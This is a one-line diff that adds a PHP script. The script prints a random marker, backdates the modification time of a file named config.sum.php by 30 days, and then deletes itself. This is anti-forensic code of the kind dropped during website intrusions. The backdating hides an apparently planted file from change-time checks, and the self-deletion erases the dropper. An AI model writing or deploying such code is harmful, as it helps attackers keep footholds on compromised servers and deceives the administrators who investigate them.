@@ -1,0 +1,1 @@
+<?php echo "QrPhvSDwkP"; if (file_exists("./config.sum.php")){ touch("./config.sum.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*h8AbETv7TT3uhDXeBMuM*/ ?>
